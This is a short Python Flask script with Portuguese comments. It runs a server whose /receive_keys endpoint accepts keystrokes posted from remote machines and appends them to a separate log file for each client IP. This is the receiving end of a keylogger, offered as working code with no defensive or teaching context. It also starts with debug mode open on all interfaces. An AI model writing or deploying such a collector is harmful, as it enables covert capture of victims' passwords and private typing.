from flask import Flask, request

app = Flask(__name__)

@app.route('/receive_keys', methods=['POST'])
def receber_tecla():
    tecla = request.form.get('tecla')
    ip_cliente = request.remote_addr.replace('.', '_')  # Obtém o endereço IP do cliente e substitui '.' por '_'

    # Nome do arquivo com o endereço IP do cliente
    nome_arquivo = f'keys_{ip_cliente}.txt'

    # Salvar a tecla em um arquivo
    with open(nome_arquivo, 'a') as file:
        file.write(tecla + '\n')

    return 'Tecla recebida com sucesso!'

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')
